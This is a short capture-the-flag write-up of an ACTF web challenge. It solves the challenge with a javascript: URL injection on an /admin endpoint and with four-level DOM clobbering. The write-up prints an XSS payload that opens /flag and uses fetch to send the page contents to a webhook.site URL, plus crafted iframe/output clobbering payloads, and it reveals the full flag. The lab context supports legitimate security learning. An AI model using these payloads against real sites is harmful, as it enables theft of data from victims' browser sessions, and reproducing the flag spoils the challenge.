# Solution

After trying to play arround with CRSF at `/beAdmin` endpoint, my senior told me that `/admin` didn't check if the protocol has to start with `http:` or `https:`. So we can use `javascript:` protocol to execute JS, steal the flag and send to our webhook.

payload for getting flag1: 
```
javascript:a=window.open('/flag');setTimeout(()=>fetch('https://webhook.site/c843ee73-806d-4d3b-a3d6-bbd53e29e82e?'+encodeURIComponent(a.document.body.innerText)),3000)
```

=> `ACTF{3asy_csrf_a`

flag2 will be sent if `fff.lll.aaa.ggg.value == "this_is_what_i_want"` is satified:

```JS
await page.evaluate((url, FLAG) => {
    if (fff.lll.aaa.ggg.value == "this_is_what_i_want") {
        fetch(url + '?part2=' + btoa(encodeURIComponent(FLAG.substring(16))))
    } else {
        fetch(url + '?there_is_no_flag')
    }
}, url, FLAG)
```

And at the time I see `fff.lll.aaa.ggg.value` i know [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering) is what i need.

After searching, i found a research post about how to perform `DOM clobbering` with multiple levels and in this context are 4 levels.
It's [here](https://portswigger.net/research/dom-clobbering-strikes-back#:~:text=Update...Clobbering%20more%20than%203%20levels).

Original payload in the post:
```html
<iframe name=a srcdoc="
<iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
<script>setTimeout(()=>alert(a.b.c.d),500)</script>
```

My modifed payload to solve the challenge:

```html
    <iframe name=fff srcdoc="
        <iframe srcdoc='<output id=aaa name=ggg>this_is_what_i_want</output><a id=aaa>' name=lll>"></iframe>
```

=> `nd_bypass_stup1d_tok3n_g3n3rator_and_use_d0m_clobberring!!!}`



[-]FLAG: *ACTF{3asy_csrf_and_bypass_stup1d_tok3n_g3n3rator_and_use_d0m_clobberring!!!}*